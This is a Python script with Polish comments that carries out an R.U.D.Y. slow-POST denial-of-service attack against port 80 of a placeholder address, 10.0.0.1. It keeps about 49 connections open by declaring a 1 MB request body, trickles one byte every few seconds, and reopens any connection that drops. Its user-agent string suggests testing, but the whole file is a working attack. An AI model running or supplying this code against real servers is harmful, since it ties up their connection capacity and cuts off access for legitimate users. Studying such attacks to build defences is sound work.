#!/usr/bin/env python3
import socket
import random
import time
import sys

TARGET_IP = "10.0.0.1"
PORT = 80
SOCKET_COUNT = 49
SLEEP_TIME = 8
sockets = []

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((TARGET_IP, PORT))
        
        # Wysyłamy w pełni zakończone nagłówki HTTP (z podwójnym \r\n na końcu)
        s.send(f"POST /?rand={random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {TARGET_IP}\r\n".encode("utf-8"))
        s.send("User-Agent: RUDY-Testing-Script\r\n".encode("utf-8"))
        s.send("Content-Type: application/x-www-form-urlencoded\r\n".encode("utf-8"))
        
        # KLUCZOWY ELEMENT: Deklarujemy 1 MB danych w ciele zapytania (Body)
        s.send("Content-Length: 1000000\r\n".encode("utf-8"))
        s.send("Connection: keep-alive\r\n\r\n".encode("utf-8"))
        return s
    except socket.error:
        return None

print(f"[*] Rozpoczynam atak R.U.D.Y. na {TARGET_IP}:{PORT}")
print(f"[*] Próba nawiązania {SOCKET_COUNT} połączeń POST...")

for _ in range(SOCKET_COUNT):
    s = create_socket()
    if s: 
        sockets.append(s)

print(f"[+] Udało się otworzyć {len(sockets)} połączeń. Rozpoczynam powolne wysyłanie body...")

try:
    while True:
        print(f"[*] Wysyłanie 1 bajtu danych do {len(sockets)} otwartych gniazd...")
        for s in list(sockets):
            try:
                # Wysyłamy tylko 1 bajt (literę 'a')
                s.send(b"a")
            except socket.error:
                sockets.remove(s)
                
        # Uzupełnianie przerwanych połączeń
        for _ in range(SOCKET_COUNT - len(sockets)):
            s = create_socket()
            if s: 
                sockets.append(s)
                
        time.sleep(SLEEP_TIME)

except KeyboardInterrupt:
    print("\n[*] Przerywam atak. Zamykam połączenia.")
    for s in sockets:
        s.close()
    sys.exit(0)